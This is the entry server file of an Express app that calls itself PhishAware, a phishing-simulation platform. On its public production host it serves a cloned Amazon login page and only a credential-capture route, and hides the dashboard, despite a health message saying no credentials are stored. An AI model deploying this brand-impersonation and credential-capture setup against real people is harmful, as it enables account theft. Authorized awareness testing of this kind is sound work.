require('dotenv').config();
const express = require('express');
const path = require('path');
const cors = require('cors');
const connectDB = require('./src/config/db');

const trackRoutes = require('./src/routes/trackRoutes');
const adminRoutes = require('./src/routes/adminRoutes');
const credentialCapture = require('./src/routes/credentialCapture');
const Template = require('./src/models/Template');
const defaultTemplates = require('./src/data/defaultTemplates');

const app = express();
const PORT = process.env.PORT || 3000;

// Check if running on Render (production) - check actual hostname, not BASE_URL
const isProduction = process.env.RENDER || process.env.RENDER_SERVICE_ID || (process.env.BASE_URL && process.env.BASE_URL.includes('onrender.com') && process.env.PORT === '10000');

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Trust proxy for Render/other cloud platforms
app.set('trust proxy', true);

// View engine for awareness education page (only for localhost)
if (!isProduction) {
  app.set('views', path.join(__dirname, 'src', 'views'));
  app.set('view engine', 'ejs');
}

// Serve Amazon phishing page (before static middleware to take precedence)
app.get('/amazon/index.html', (req, res) => {
  console.log('Amazon page requested');
  const filePath = path.join(__dirname, 'public', 'amazon', 'index.html');
  console.log('File path:', filePath);
  res.sendFile(filePath);
});

// Serve Amazon assets directly
app.get('/amazon/assets/:filename', (req, res) => {
  const filename = req.params.filename;
  const assetPath = path.join(__dirname, 'public', 'amazon', 'assets', filename);
  console.log('Amazon asset requested:', filename);
  console.log('Full asset path:', assetPath);
  res.sendFile(assetPath, (err) => {
    if (err) {
      console.error('Error serving asset:', err);
      res.status(404).send('Asset not found');
    }
  });
});

// Serve Amazon logo image
app.get('/amazon_image.png', (req, res) => {
  const imagePath = path.join(__dirname, 'public', 'amazon_image.png');
  console.log('Amazon logo requested');
  res.sendFile(imagePath, (err) => {
    if (err) {
      console.error('Error serving Amazon logo:', err);
      res.status(404).send('Image not found');
    }
  });
});

// Static assets (Dashboard UI, CSS, JS) - Only on localhost
if (!isProduction) {
  app.use(express.static(path.join(__dirname, 'public')));
}

// Mount Routes
app.use('/track', trackRoutes);

// Admin routes - Only on localhost
if (!isProduction) {
  app.use('/api/admin', adminRoutes);
} else {
  // On Render, only enable credential capture endpoint
  app.use('/api/admin', credentialCapture);
}

// Health check & safety disclaimer endpoint
app.get('/api/health', (req, res) => {
  res.json({
    status: 'online',
    system: 'PhishAware - Authorized Security Awareness Platform',
    policy: 'Strictly authorized testing environment. No credentials or passwords stored.'
  });
});

// Auto-seed default templates on startup if none exist
async function autoSeedTemplates() {
  const mongoose = require('mongoose');
  if (mongoose.connection.readyState === 1) {
    try {
      const count = await Template.countDocuments();
      if (count === 0) {
        await Template.insertMany(defaultTemplates);
        console.log(' Pre-loaded default simulated phishing scenarios into MongoDB.');
      }
    } catch (err) {
      console.warn(' Template auto-seed notice:', err.message);
    }
  }
}

// Start Server
async function startServer() {
  await connectDB();
  autoSeedTemplates();

  app.listen(PORT, () => {
    console.log(`=======================================================`);
    if (isProduction) {
      console.log(`� Login Page Running (Production)`);
      console.log(`📡 URL: https://phish-tracker-1.onrender.com`);
      console.log(`📊 Dashboard: Disabled (use localhost)`);
    } else {
      console.log(`��️  PhishAware - Phishing Simulation Platform Running`);
      console.log(`📡 URL: http://localhost:${PORT}`);
      console.log(`📊 Admin Dashboard: http://localhost:${PORT}/index.html`);
    }
    console.log(`💾 MongoDB Atlas Connected`);
    console.log(`=======================================================`);
  });
}

startServer();
